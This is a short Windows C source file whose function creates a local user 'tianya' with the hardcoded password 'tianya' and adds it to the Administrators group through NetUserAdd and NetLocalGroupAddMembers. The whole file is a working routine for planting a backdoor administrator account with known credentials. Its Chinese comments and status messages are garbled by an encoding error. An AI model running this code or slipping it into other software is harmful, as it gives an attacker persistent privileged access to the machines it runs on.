#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <assert.h>
#include <windows.h> 
#include <lm.h>

void OnAdduser()
{
	// TODO: Add your control notification handler code here
	// UpdateData(true);
	USER_INFO_1 ui;
	DWORD dwError = 0;

	ui.usri1_name = L"tianya";
	ui.usri1_password = L"tianya";
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;


	if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
	{
		//��ӳɹ�
		printf("����û��ɹ�!\n");
	}
	else
	{
		//���ʧ��
		printf("����û�ʧ��!\n");
	}


	wchar_t szAccountName[100] = { 0 };
	wcscpy(szAccountName, L"tianya");
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = szAccountName;
	//��ӵ�Administrators��
	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
	{
		//��ӹ���Ա��
		printf("��ӵ�����Ա��ɹ�!\n");
	}
	else
	{
		//���ʧ��
		printf("��ӵ�����Ա��ʧ��!\n");
	}
}